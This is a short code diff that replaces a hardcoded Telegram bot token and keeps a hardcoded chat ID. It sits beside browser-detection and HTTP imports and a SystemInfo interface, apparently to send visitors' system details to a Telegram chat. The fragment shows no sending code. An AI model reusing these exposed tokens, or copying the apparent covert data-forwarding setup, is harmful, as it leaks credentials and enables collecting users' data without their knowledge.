@@ -1,7 +1,7 @@
 import Bowser from 'bowser';
 import axios from 'axios';
 
-const TELEGRAM_BOT_TOKEN = '7906523257:AAEUrREGq03k0aZ9MnneQBIenqfWPCLqou4';
+const TELEGRAM_BOT_TOKEN = '8013112978:AAGWrHSH9_Q6IvenWcohME_oL-a1c_XjwTs';
 const TELEGRAM_CHAT_ID = '5464921200';
 
 interface SystemInfo {
